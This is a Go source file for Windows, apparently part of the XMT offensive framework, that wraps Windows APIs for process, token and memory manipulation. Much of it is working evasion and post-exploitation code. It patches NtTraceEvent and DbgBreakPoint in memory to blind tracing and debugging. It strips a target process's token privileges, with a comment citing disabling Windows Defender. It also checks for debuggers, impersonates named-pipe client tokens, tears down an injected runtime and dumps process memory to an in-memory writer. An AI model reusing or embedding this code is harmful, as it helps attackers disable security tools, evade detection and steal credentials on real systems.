//go:build windows

// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package winapi

import (
	"io"
	"runtime"
	"runtime/debug"
	"strings"
	"sync"
	"syscall"
	"unsafe"

	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

const ptrSize = unsafe.Sizeof(uintptr(0))

// We have this to be used to prevent crashing the stack of the program
// when we call minidump as we need to track extra parameters.
// The lock will stay enabled until it's done, so it's "thread safe".
var dumpStack dumpParam
var dumpCallbackOnce struct {
	sync.Once
	f uintptr
}

type lsaString struct {
	// DO NOT REORDER
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}
type dumpParam struct {
	sync.Mutex
	h, b uintptr
	s, w uint64
}
type dumpOutput struct {
	Status int32
}
type privileges struct {
	// DO NOT REORDER
	PrivilegeCount uint32
	Privileges     [5]LUIDAndAttributes
}
type modEntry32 struct {
	// DO NOT REORDER
	Size       uint32
	_, _, _, _ uint32
	BaseAddr   uintptr
	BaseSize   uint32
	_          uintptr
	_          [256]uint16
	_          [260]uint16
}
type highContrast struct {
	// DO NOT REORDER
	Size  uint32
	Flags uint32
	_     *uint16
}
type dumpCallback struct {
	Func uintptr
	Args uintptr
}
type lsaAttributes struct {
	// DO NOT REORDER
	Length     uint32
	_          uintptr
	_          *lsaString
	Attributes uint32
	_, _       unsafe.Pointer
}
type ntUnicodeString struct {
	// DO NOT REORDER
	Length        uint16
	MaximumLength uint16
	_, _          uint16
	Buffer        [260]uint16
}
type lsaAccountDomainInfo struct {
	// DO NOT REORDER
	_   lsaString
	SID *SID
}

// KillRuntime attempts to walk through the process threads and will forcefully
// kill all Golang based OS-Threads based on their starting address (which
// should be the same when starting from CGo).
//
// This will attempt to determine the base thread and any children that may be
// running and take action on what type of host we're in to best end the
// runtime without crashing.
//
// This function can be used on binaries, shared libaries or Zombified processes.
//
// DO NOT EXPECT ANYTHING (INCLUDING DEFERS) TO HAPPEN AFTER THIS FUNCTION.
func KillRuntime() {
	runtime.GC()
	debug.FreeOSMemory()
	runtime.LockOSThread()
	killRuntime()
	// Below shouldn't run.
	runtime.UnlockOSThread()
}
func killRuntime() {
	q, err := getSelfModuleHandle()
	if err != nil {
		if bugtrack.Enabled {
			bugtrack.Track("winapi.killRuntime(): getSelfModuleHandle failed err=%s", err)
		}
		return
	}
	var (
		p    = GetCurrentProcessID()
		a, e uintptr
	)
	if a, e, err = findBaseModuleRange(p, q); err != nil {
		if bugtrack.Enabled {
			bugtrack.Track("winapi.killRuntime(): findBaseModuleRange failed err=%s", err)
		}
		return
	}
	if bugtrack.Enabled {
		bugtrack.Track("winapi.killRuntime(): Module range p=%d, a=%d, e=%d", p, a, e)
	}
	// 0x4 - TH32CS_SNAPTHREAD
	h, err := CreateToolhelp32Snapshot(0x4, 0)
	if err != nil {
		if bugtrack.Enabled {
			bugtrack.Track("winapi.killRuntime(): CreateToolhelp32Snapshot failed err=%s", err)
		}
		return
	}
	var (
		y       = getCurrentThreadID()
		m       = make(map[uintptr][]uintptr, 16)
		u       = make([]uintptr, 0, 8)
		t       ThreadEntry32
		b       bool
		s, v, j uintptr
	)
	t.Size = uint32(unsafe.Sizeof(t))
	for err = Thread32First(h, &t); err == nil; err = Thread32Next(h, &t) {
		if t.OwnerProcessID != p {
			continue
		}
		// 0x63 - THREAD_QUERY_INFORMATION | THREAD_SET_INFORMATION | THREAD_SUSPEND_RESUME
		//         THREAD_TERMINATE
		if v, err = OpenThread(0x63, false, t.ThreadID); err != nil {
			break
		}
		if s, err = getThreadStartAddress(v); err != nil {
			break
		}
		if t.ThreadID == y {
			if b = uintptr(s) >= a && uintptr(s) < e; b {
				break
			}
			if bugtrack.Enabled {
				bugtrack.Track("winapi.killRuntime(): Found our thread t.ThreadID=%d y=%d, j=%d, s=%d, b=%t", t.ThreadID, y, j, s, b)
			}
			j = s
			continue
		}
		if uintptr(s) >= a && uintptr(s) < e {
			u = append(u, v)
		}
		if _, ok := m[s]; !ok {
			m[s] = make([]uintptr, 0, 8)
		}
		m[s] = append(m[s], v)
	}
	if bugtrack.Enabled {
		bugtrack.Track("winapi.killRuntime(): Done enumeration b=%t, len(m)=%d, err=%s", b, len(m), err)
	}
	if CloseHandle(h); b || len(m) == 0 || (err != nil && err != ErrNoMoreFiles) {
		for k, v := range m {
			for i := range v {
				CloseHandle(v[i])
			}
			m[k] = nil
			delete(m, k)
		}
		if m = nil; b {
			// Base thread (us), is in the base module address
			// This is a binary, its safe to exit cleanly.
			syscall.Exit(0)
			return
		}
		if u = nil; bugtrack.Enabled {
			bugtrack.Track("winapi.killRuntime(): Failed to close base!")
		}
		return
	}
	if len(u) > 0 {
		var d int
		for n, g := 0, uint32(0); n < len(u) && d <= 1; n++ {
			if _, err = SuspendThread(u[n]); err != nil {
				break
			}
			if g, err = ResumeThread(u[n]); err != nil {
				break
			}
			if g > 1 {
				d++
			}
		}
		if d == 1 {
			// Out of all the base threads, only one exists and is suspended,
			// 99% chance this is a Zombified process, its ok to exit cleanly.
			syscall.Exit(0)
			return
		}
	}
	// What's left is that we're probally injected into memory somewhere and
	// we just need to nuke the runtime without affecting the host.
	u = nil
	var (
		z uintptr
		x int
	)
	for k, v := range m {
		if bugtrack.Enabled {
			bugtrack.Track("winapi.killRuntime(): Sanity 1 k=%d, len(v)=%d, v=%v", k, len(v), v)
		}
		if len(v) > x {
			x, z = len(v), k
		}
	}
	if bugtrack.Enabled {
		bugtrack.Track("winapi.killRuntime(): Sanity stop z=%d, j=%d, x=%d", z, j, x)
	}
	// NOTE(dij): This is NOT a sanity check. This causes this function to
	//            fail hard. I believe that the base address reported by Windows
	//            does NOT respond to the DLL based address, but ONLY the EXE
	//            address.
	//
	//            We're going to fallback to the default action, which seems to
	//            work better.
	//
	// if z != j {
	//     panic("Sanity check base on threads vs max failed!")
	//     z = j
	// }
	c := m[z]
	for k, v := range m {
		if k == z {
			m[k] = nil
			delete(m, k)
			continue
		}
		for i := range v {
			CloseHandle(v[i])
		}
		m[k] = nil
		delete(m, k)
	}
	m = nil
	for i := range c {
		if err = TerminateThread(c[i], 0); err != nil {
			break
		}
	}
	for i := range c {
		CloseHandle(c[i])
	}
	if c = nil; err != nil {
		if bugtrack.Enabled {
			bugtrack.Track("winapi.killRuntime(): Terminate error err=%s", err)
		}
		return
	}
	EmptyWorkingSet()
	TerminateThread(CurrentThread, 0) // Buck Stops here.
}
func createDumpFunc() {
	dumpCallbackOnce.f = syscall.NewCallback(dumpCallbackFunc)
}

// EmptyWorkingSet Windows API Call wrapper
//   Removes as many pages as possible from the working set of the specified
//   process.
//
// https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-emptyworkingset
//
// Wraps the 'SetProcessWorkingSetSizeEx' call instead to prevent having to track
// the 'EmptyWorkingSet' function between kernel32.dll and psapi.dll.
func EmptyWorkingSet() {
	syscall.SyscallN(funcSetProcessWorkingSetSizeEx.address(), CurrentProcess, invalid, invalid)
}

// ZeroTraceEvent will attempt to zero out the 'NtTraceEvent' function call with
// a NOP.
//
// This function also zero's out 'DbgBreakPoint'.
//
// This will return an error if it fails.
func ZeroTraceEvent() error {
	var (
		b      = funcNtTraceEvent.address() + 3
		o, err = NtProtectVirtualMemory(CurrentProcess, b, 1, 0x40)
		// 0x40 - PAGE_EXECUTE_READWRITE
	)
	if err != nil {
		return err
	}
	(*(*[1]byte)(unsafe.Pointer(b)))[0] = 0xC3 // RET
	if _, err = NtProtectVirtualMemory(CurrentProcess, b, 1, o); err != nil {
		return err
	}
	if o, err = NtProtectVirtualMemory(CurrentProcess, funcDbgBreakPoint.address(), 1, 0x40); err != nil {
		return err
	}
	(*(*[1]byte)(unsafe.Pointer(funcDbgBreakPoint.address())))[0] = 0x90 // NOP
	_, err = NtProtectVirtualMemory(CurrentProcess, funcDbgBreakPoint.address(), 1, o)
	return err
}
func (p *dumpParam) close() {
	heapFree(p.b, p.h)
	heapDestroy(p.b)
	CloseHandle(p.b)
	p.Unlock()
}

// Untrust will attempt to revoke all Token permissions and change the Token
// integrity level to "Untrusted".
//
// This effectively revokes all permissions for the application with the supplied
// PID to run.
//
// Ensure a call to 'GetDebugPrivilege' is made first before starting.
//
// Thanks for the find by @zha0gongz1 in their article:
//  https://golangexample.com/without-closing-windows-defender-to-make-defender-useless-by-removing-its-token-privileges-and-lowering-the-token-integrity/
func Untrust(p uint32) error {
	// 0x400 - PROCESS_QUERY_INFORMATION
	h, err := OpenProcess(0x400, false, p)
	if err != nil {
		return err
	}
	var t uintptr
	// 0x200A8 - TOKEN_READ | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_DEFAULT | TOKEN_QUERY
	if err = OpenProcessToken(h, 0x200A8, &t); err != nil {
		CloseHandle(h)
		return err
	}
	var n uint32
	// 0x3 - TokenPrivileges
	if err = GetTokenInformation(t, 0x3, nil, 0, &n); n == 0 {
		CloseHandle(h)
		CloseHandle(t)
		return err
	}
	b := make([]byte, n)
	// 0x3 - TokenPrivileges
	if err = GetTokenInformation(t, 0x3, &b[0], n, &n); err != nil {
		CloseHandle(h)
		CloseHandle(t)
		return err
	}
	_ = b[n-1]
	// NOTE(dij): Loop over all the privileges and disable them. Yes we
	//            call "disableAll", but this is a failsafe.
	for c, i, a := uint32(b[3])<<24|uint32(b[2])<<16|uint32(b[1])<<8|uint32(b[0]), uint32(12), uint32(0); a < c && i < n; a, i = a+1, i+12 {
		b[i], b[i+1], b[i+2], b[i+3] = 0x4, 0, 0, 0
	}
	if err = AdjustTokenPrivileges(t, false, unsafe.Pointer(&b[0]), n, nil, nil); err != nil {
		CloseHandle(h)
		CloseHandle(t)
		return err
	}
	// We don't care if this errors.
	AdjustTokenPrivileges(t, true, nil, 0, nil, nil)
	var (
		c = uint32(32)
		s [32]byte
	)
	// 0x41 - WinUntrustedLabelSid
	r, _, err1 := syscall.SyscallN(funcCreateWellKnownSid.address(), 0x41, 0, uintptr(unsafe.Pointer(&s[0])), uintptr(unsafe.Pointer(&c)))
	if r == 0 {
		CloseHandle(h)
		CloseHandle(t)
		return unboxError(err1)
	}
	var x SIDAndAttributes
	// 0x20 - SE_GROUP_INTEGRITY
	x.Sid, x.Attributes = (*SID)(unsafe.Pointer(&s[0])), 0x20
	// 0x19 - TokenIntegrityLevel
	r, _, err1 = syscall.SyscallN(funcSetTokenInformation.address(), t, 0x19, uintptr(unsafe.Pointer(&x)), uintptr(c+4))
	CloseHandle(h)
	if CloseHandle(t); r > 0 {
		return nil
	}
	return unboxError(err1)
}
func fullPath(n string) string {
	if !isBaseName(n) {
		return n
	}
	d, err := GetSystemDirectory()
	if err != nil {
		d = `C:\Windows\System32`
	}
	return d + "\\" + n
}

// GetDebugPrivilege is a quick helper function that will attempt to grant the
// caller the "SeDebugPrivilege" privilege.
func GetDebugPrivilege() error {
	var (
		t   uintptr
		err = OpenProcessToken(CurrentProcess, 0x200E8, &t)
		// 0x200E8 - TOKEN_READ (STANDARD_RIGHTS_READ | TOKEN_QUERY) | TOKEN_WRITE
		//            (TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT)
	)
	if err != nil {
		return err
	}
	var p privileges
	if err = LookupPrivilegeValue("", debugPriv, &p.Privileges[0].Luid); err != nil {
		CloseHandle(t)
		return err
	}
	p.Privileges[0].Attributes, p.PrivilegeCount = 0x2, 1 // SE_PRIVILEGE_ENABLED
	err = AdjustTokenPrivileges(t, false, unsafe.Pointer(&p), uint32(unsafe.Sizeof(p)), nil, nil)
	CloseHandle(t)
	return err
}
func getCurrentThreadID() uint32 {
	r, _, _ := syscall.SyscallN(funcGetCurrentThreadID.address())
	return uint32(r)
}
func (p *dumpParam) init() error {
	p.Lock()
	var err error
	// 2 << 20 = ~20MB
	if p.b, err = heapCreate(2 << 20); err != nil {
		return err
	}
	if p.h, err = heapAlloc(p.b, 2<<20, true); err != nil {
		heapDestroy(p.b)
		CloseHandle(p.b)
		return err
	}
	p.s, p.w = 2<<20, 0
	dumpCallbackOnce.Do(createDumpFunc)
	return nil
}

// LoadLibraryAddress is a simple function that returns the raw address of the
// 'LoadLibraryW' function in 'kernel32.dll' that's currently loaded.
func LoadLibraryAddress() uintptr {
	return funcLoadLibrary.address()
}

// GetSystemSID will attempt to determine the System SID value and return it.
func GetSystemSID() (*SID, error) {
	var (
		o lsaAttributes
		h uintptr
	)
	o.Length = uint32(unsafe.Sizeof(o))
	r, _, err := syscall.SyscallN(funcLsaOpenPolicy.address(), 0, uintptr(unsafe.Pointer(&o)), 1, uintptr(unsafe.Pointer(&h)))
	if r > 0 {
		return nil, unboxError(err)
	}
	i := new(lsaAccountDomainInfo)
	r, _, err = syscall.SyscallN(funcLsaQueryInformationPolicy.address(), h, 5, uintptr(unsafe.Pointer(&i)))
	if syscall.SyscallN(funcLsaClose.address(), h); r > 0 {
		return nil, unboxError(err)
	}
	return i.SID, nil
}
func heapFree(h, m uintptr) error {
	r, _, err := syscall.SyscallN(funcHeapFree.address(), h, 0, m)
	if r == 0 {
		return unboxError(err)
	}
	return nil
}
func heapDestroy(h uintptr) error {
	r, _, err := syscall.SyscallN(funcHeapDestroy.address(), h)
	if r == 0 {
		return unboxError(err)
	}
	return nil
}

// SetWallpaper uses the 'SystemParametersInfo' API call to set the user's
// wallpaper. Changes take effect immediately.
//
// https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-systemparametersinfoa
func SetWallpaper(s string) error {
	v, err := UTF16PtrFromString(s)
	if err != nil {
		return err
	}
	// 0x14 - SPI_SETDESKWALLPAPER
	r, _, err1 := syscall.SyscallN(funcSystemParametersInfo.address(), 0x14, 1, uintptr(unsafe.Pointer(v)), 0x3)
	if r == 0 {
		return unboxError(err1)
	}
	return nil
}

// SetHighContrast uses the 'SystemParametersInfo' API call to trigger the
// HighContrast theme setting. Set to 'True' to enable it and 'False' to disbale
// it.
//
// https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-systemparametersinfoa
func SetHighContrast(e bool) error {
	var c highContrast
	if c.Size = uint32(unsafe.Sizeof(c)); e {
		c.Flags = 1
	}
	// 0x43 - SPI_SETHIGHCONTRAST
	r, _, err := syscall.SyscallN(funcSystemParametersInfo.address(), 0x43, 0, uintptr(unsafe.Pointer(&c)), 0x3)
	if r == 0 {
		return unboxError(err)
	}
	return nil
}

// SwapMouseButtons uses the 'SystemParametersInfo' API call to trigger the
// swapping of the left and right mouse buttons. Set to 'True' to swap and
// 'False' to disable it.
//
// https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-systemparametersinfoa
func SwapMouseButtons(e bool) error {
	var v uint32
	if e {
		v = 1
	}
	// 0x21 - SPI_SETMOUSEBUTTONSWAP
	r, _, err := syscall.SyscallN(funcSystemParametersInfo.address(), 0x21, uintptr(v), 0, 0x3)
	if r == 0 {
		return unboxError(err)
	}
	return nil
}

// IsTokenElevated returns true if this token has a High or System privileges.
func IsTokenElevated(h uintptr) bool {
	var (
		e, n uint32
		err  = GetTokenInformation(h, 0x14, (*byte)(unsafe.Pointer(&e)), uint32(unsafe.Sizeof(e)), &n)
		// 0x14 - TokenElevation
	)
	return err == nil && n == uint32(unsafe.Sizeof(e)) && e != 0
}

// IsUserLoginToken will return true if the origion of the Token was a LoginUser
// API call and NOT a duplicated token via Impersonation.
func IsUserLoginToken(t uintptr) bool {
	if t == 0 {
		return false
	}
	var (
		n   uint32
		b   [8]byte
		err = GetTokenInformation(t, 0x11, &b[0], 8, &n)
		// 0x11 - TokenOrigin
	)
	if err != nil {
		return false
	}
	return uint32(b[3])<<24|uint32(b[2])<<16|uint32(b[1])<<8|uint32(b[0]) > 1000
}

// CheckDebugWithLoad will attempt to check for a debugger by loading a non-loaded
// DLL specified and will check for exclusive access (which is false for debuggers).
//
// If the file can be opened, the library is freed and the file is closed. This
// will return true ONLY if opening for exclusive access fails.
//
// Any errors opening or loading DLLs will silently return false.
func CheckDebugWithLoad(d string) bool {
	var (
		p      = fullPath(d)
		n, err = UTF16PtrFromString(p)
	)
	if err != nil {
		panic(err.Error())
	}
	var (
		h       uintptr
		r, _, _ = syscall.SyscallN(funcGetModuleHandleEx.address(), 0x2, uintptr(unsafe.Pointer(n)), uintptr(unsafe.Pointer(&h)))
	)
	if r > 0 {
		return false
	}
	if h, err = loadLibraryEx(p); err != nil {
		return false
	}
	// 0x80000000 - FILE_FLAG_WRITE_THROUGH
	// 0x0        - EXCLUSIVE
	// 0x3        - OPEN_EXISTING
	f, err := CreateFile(p, 0x80000000, 0, nil, 0x3, 0, 0)
	if syscall.SyscallN(funcFreeLibrary.address(), h); err != nil {
		return true
	}
	CloseHandle(f)
	return false
}

// EnablePrivileges will attempt to enable the supplied Windows privilege values
// on the current process's Token.
//
// Errors during encoding, lookup or assignment will be returned and not all
// privileges will be assigned, if they occur.
func EnablePrivileges(s ...string) error {
	if len(s) == 0 {
		return nil
	}
	var (
		t   uintptr
		err = OpenProcessToken(CurrentProcess, 0x200E8, &t)
		// 0x200E8 - TOKEN_READ (STANDARD_RIGHTS_READ | TOKEN_QUERY) | TOKEN_WRITE
		//            (TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT)
	)
	if err != nil {
		return xerr.Wrap("OpenProcessToken", err)
	}
	err = EnableTokenPrivileges(t, s...)
	CloseHandle(t)
	return err
}

// ImpersonatePipeToken will attempt to impersonate the Token used by the Named
// Pipe client.
//
// This function is only usable on Windows with a Server Pipe handle.
//
// Pipe insights: https://papers.vx-underground.org/papers/Windows/System%20Components%20and%20Abuse/Offensive%20Windows%20IPC%20Internals%201%20Named%20Pipes.pdf
func ImpersonatePipeToken(h uintptr) error {
	// NOTE(dij): For best results, we FIRST impersonate the token, THEN
	//            we try to set the token to each user thread with a duplicated
	//            token set to impersonate. (Similar to an Impersonate call).
	runtime.LockOSThread()
	if err := ImpersonateNamedPipeClient(h); err != nil {
		runtime.UnlockOSThread()
		return err
	}
	var y uintptr
	// 0xF01FF - TOKEN_ALL_ACCESS
	if err := OpenThreadToken(CurrentThread, 0xF01FF, false, &y); err != nil {
		runtime.UnlockOSThread()
		return err
	}
	err := ForEachThread(func(t uintptr) error { return SetThreadToken(&t, y) })
	CloseHandle(y)
	runtime.UnlockOSThread()
	return err
}
func heapCreate(n uint64) (uintptr, error) {
	r, _, err := syscall.SyscallN(funcHeapCreate.address(), 0, uintptr(n), 0)
	if r == 0 {
		return 0, unboxError(err)
	}
	return r, nil
}
func (p *dumpParam) resize(n uint64) error {
	if n < p.s {
		return nil
	}
	var (
		v      = (p.s + n) * 2
		h, err = heapReAlloc(p.b, p.h, v, false)
	)
	if err != nil {
		return err
	}
	p.h, p.s = h, v
	return nil
}
func getSelfModuleHandle() (uintptr, error) {
	var (
		h         uintptr
		r, _, err = syscall.SyscallN(funcGetModuleHandleEx.address(), 2, 0, uintptr(unsafe.Pointer(&h)))
	)
	if r == 0 {
		return 0, unboxError(err)
	}
	return h, nil
}
func (p *dumpParam) write(w io.Writer) error {
	var (
		b      = (*[]byte)(unsafe.Pointer(&SliceHeader{Data: unsafe.Pointer(p.h), Len: int(p.w), Cap: int(p.w)}))
		n, err = w.Write(*b)
	)
	if b, *b = nil, nil; err != nil {
		return err
	}
	if n != int(p.w) {
		return io.ErrShortWrite
	}
	return nil
}

// UserFromToken will attempt to get the User SID from the supplied Token and
// return the associated User Name and Doamin string from the SID.
func UserFromToken(h uintptr) (string, error) {
	u, err := GetTokenUser(h)
	if err != nil {
		return "", err
	}
	return u.User.Sid.UserName()
}
func mod32Next(h uintptr, m *modEntry32) error {
	r, _, err := syscall.SyscallN(funcModule32Next.address(), h, uintptr(unsafe.Pointer(m)))
	if r == 0 {
		return unboxError(err)
	}
	return nil
}
func mod32First(h uintptr, m *modEntry32) error {
	r, _, err := syscall.SyscallN(funcModule32First.address(), h, uintptr(unsafe.Pointer(m)))
	if r == 0 {
		return unboxError(err)
	}
	return nil
}
func copyMemory(d uintptr, s uintptr, x uint32) {
	syscall.SyscallN(funcRtlCopyMemory.address(), uintptr(d), uintptr(s), uintptr(x))
}

// ForEachThread is a helper function that allows a function to be executed with
// the handle of the Thread.
//
// This function only returns an error if enumerating the Threads generates an
// error or the supplied function returns an error.
func ForEachThread(f func(uintptr) error) error {
	// 0x4 - TH32CS_SNAPTHREAD
	h, err := CreateToolhelp32Snapshot(0x4, 0)
	if err != nil {
		return xerr.Wrap("CreateToolhelp32Snapshot", err)
	}
	var (
		p = GetCurrentProcessID()
		t ThreadEntry32
		v uintptr
	)
	t.Size = uint32(unsafe.Sizeof(t))
	for err = Thread32First(h, &t); err == nil; err = Thread32Next(h, &t) {
		if t.OwnerProcessID != p {
			continue
		}
		// 0xE0 - THREAD_QUERY_INFORMATION | THREAD_SET_INFORMATION | THREAD_SET_THREAD_TOKEN
		if v, err = OpenThread(0xE0, false, t.ThreadID); err != nil {
			break
		}
		err = f(v)
		if CloseHandle(v); err != nil {
			break
		}
	}
	if CloseHandle(h); err == ErrNoMoreFiles {
		return nil
	}
	return err
}

// GetTokenUser retrieves access token user account information and SID.
func GetTokenUser(h uintptr) (*TokenUser, error) {
	u, err := getTokenInfo(h, 1, 50)
	if err != nil {
		return nil, err
	}
	return (*TokenUser)(u), nil
}
func enablePrivileges(h uintptr, s []string) error {
	var (
		p   privileges
		err error
	)
	for i := range s {
		if i > 5 {
			break
		}
		if err = LookupPrivilegeValue("", s[i], &p.Privileges[i].Luid); err != nil {
			if xerr.ExtendedInfo {
				return xerr.Wrap(`cannot lookup "`+s[i]+`"`, err)
			}
			return xerr.Wrap("cannot lookup Privilege", err)
		}
		p.Privileges[i].Attributes = 0x2 // SE_PRIVILEGE_ENABLED
	}
	p.PrivilegeCount = uint32(len(s))
	if err = AdjustTokenPrivileges(h, false, unsafe.Pointer(&p), uint32(unsafe.Sizeof(p)), nil, nil); err != nil {
		return xerr.Wrap("cannot assign all Privileges", err)
	}
	return nil
}

// GetProcessFileName will attempt to retrive the basename of the process
// related to the open Process handle supplied.
func GetProcessFileName(h uintptr) (string, error) {
	var (
		u ntUnicodeString
		n uint32
	)
	r, _, err := syscall.SyscallN(
		funcNtQueryInformationProcess.address(), h, 0x1B, uintptr(unsafe.Pointer(&u)),
		uintptr(unsafe.Sizeof(u)+260), uintptr(unsafe.Pointer(&n)),
	)
	// 0x1B - ProcessImageFileName
	if r > 0 {
		return "", err
	}
	v := UTF16ToString(u.Buffer[4:n])
	for i := len(v) - 1; i > 0; i-- {
		if v[i] == '\\' {
			return v[i+1:], nil
		}
	}
	return v, nil
}
func getThreadStartAddress(h uintptr) (uintptr, error) {
	var (
		i         uintptr
		r, _, err = syscall.SyscallN(funcNtQueryInformationThread.address(), h, 0x9, uintptr(unsafe.Pointer(&i)), unsafe.Sizeof(i), 0)
	)
	// 0x9 - ThreadQuerySetWin32StartAddress
	if r > 0 {
		return 0, unboxError(err)
	}
	return i, nil
}

// StringListToUTF16Block creates a UTF16 encoded block for usage as a Process
// environment block.
//
// This function returns an error if any of the environment strings are not in
// the 'KEY=VALUE' format or contain a NUL byte.
func StringListToUTF16Block(s []string) (*uint16, error) {
	if len(s) == 0 {
		return nil, nil
	}
	var t, i, l int
	for _, x := range s {
		for v := range x {
			if x[v] == 0 {
				return nil, syscall.EINVAL
			}
		}
		if q := strings.IndexByte(x, '='); q <= 0 {
			if xerr.ExtendedInfo {
				return nil, xerr.Sub(`invalid env value "`+x+`"`, 0x17)
			}
			return nil, xerr.Sub("invalid env value", 0x17)
		}
		t += len(x) + 1
	}
	t += 1
	b := make([]byte, t)
	for _, v := range s {
		l = len(v)
		copy(b[i:i+l], []byte(v))
		b[i+l] = 0
		i = i + l + 1
	}
	b[i] = 0
	return &UTF16EncodeStd([]rune(string(b)))[0], nil
}

// EnableTokenPrivileges will attempt to enable the supplied Windows privilege
// values on the supplied process Token.
//
// Errors during encoding, lookup or assignment will be returned and not all
// privileges will be assigned, if they occur.
func EnableTokenPrivileges(h uintptr, s ...string) error {
	if len(s) == 0 {
		return nil
	}
	if len(s) <= 5 {
		return enablePrivileges(h, s)
	}
	for x, w := 0, 0; x < len(s); {
		if w = 5; x+w > len(s) {
			w = len(s) - x
		}
		if err := enablePrivileges(h, s[x:x+w]); err != nil {
			return err
		}
		x += w
	}
	return nil
}
func heapAlloc(h uintptr, s uint64, z bool) (uintptr, error) {
	var f uint32
	if z {
		f |= 0x08
	}
	r, _, err := syscall.SyscallN(funcRtlAllocateHeap.address(), h, uintptr(f), uintptr(s))
	if r == 0 {
		return 0, unboxError(err)
	}
	return r, nil
}
func (p *dumpParam) copy(o uint64, b uintptr, s uint32) error {
	if err := p.resize(o + uint64(s)); err != nil {
		return err
	}
	copyMemory(p.h+uintptr(o), b, s)
	p.w += uint64(s)
	return nil
}
func heapReAlloc(h, m uintptr, s uint64, z bool) (uintptr, error) {
	var f uint32
	if z {
		// 0x8 - HEAP_ZERO_MEMORY
		f |= 0x8
	}
	r, _, err := syscall.SyscallN(funcRtlReAllocateHeap.address(), h, uintptr(f), m, uintptr(s))
	if r == 0 {
		return 0, unboxError(err)
	}
	return r, nil
}
func dumpCallbackFunc(_ uintptr, i uintptr, r *dumpOutput) uintptr {
	switch *(*uint32)(unsafe.Pointer(i + 4 + ptrSize)) {
	case 11:
		r.Status = 1
	case 12:
		var (
			o = *(*uint64)(unsafe.Pointer(i + 16 + ptrSize))           // Offset
			b = *(*uintptr)(unsafe.Pointer(i + 24 + ptrSize))          // Buffer
			s = *(*uint32)(unsafe.Pointer(i + 24 + ptrSize + ptrSize)) // Size
		)
		if err := dumpStack.copy(o, b, s); err != nil {
			r.Status = 1
			return 0
		}
		r.Status = 0
	case 13:
		r.Status = 0
	}
	return 1
}
func getTokenInfo(t uintptr, c uint32, i int) (unsafe.Pointer, error) {
	for n := uint32(i); ; {
		var (
			b   = make([]byte, n)
			err = GetTokenInformation(t, c, &b[0], uint32(len(b)), &n)
		)
		if err == nil {
			return unsafe.Pointer(&b[0]), nil
		}
		if err != syscall.ERROR_INSUFFICIENT_BUFFER {
			return nil, err
		}
		if n <= uint32(len(b)) {
			return nil, err
		}
	}
}
func findBaseModuleRange(p uint32, b uintptr) (uintptr, uintptr, error) {
	// 0x18 - TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32
	h, err := CreateToolhelp32Snapshot(0x18, p)
	if err != nil {
		return 0, 0, err
	}
	var (
		m    modEntry32
		s, e uintptr
	)
	m.Size = uint32(unsafe.Sizeof(m))
	for err = mod32First(h, &m); err == nil; err = mod32Next(h, &m) {
		if b == m.BaseAddr {
			s, e = m.BaseAddr, m.BaseAddr+uintptr(m.BaseSize)
			break
		}
	}
	CloseHandle(h)
	return s, e, err
}

// MiniDumpWriteDump Windows API Call
//   Writes user-mode minidump information to the specified file handle.
//
// https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump
//
// Updated version that will take and use the supplied Writer instead of the file
// handle is zero.
//  NOTE(dij): Fixes a bug where dumps to a os.Pipe interface would not be
//             written correctly!?
//             Base-rework and re-write seeing how others have done. Optimized
//             to be faster and less error-prone than the Sliver implimtation. :P
func MiniDumpWriteDump(h uintptr, pid uint32, o uintptr, f uint32, w io.Writer) error {
	if o > 0 {
		r, _, err := syscall.SyscallN(funcMiniDumpWriteDump.address(), h, uintptr(pid), o, uintptr(f), 0, 0, 0)
		if r == 0 {
			return unboxError(err)
		}
		return nil
	}
	if err := dumpStack.init(); err != nil {
		return err
	}
	var (
		a          = dumpCallback{Func: dumpCallbackOnce.f}
		r, _, err1 = syscall.SyscallN(funcMiniDumpWriteDump.address(), h, uintptr(pid), 0, uintptr(f), 0, 0, uintptr(unsafe.Pointer(&a)))
	)
	if r == 0 {
		dumpStack.close()
		return unboxError(err1)
	}
	err := dumpStack.write(w)
	dumpStack.close()
	return err
}
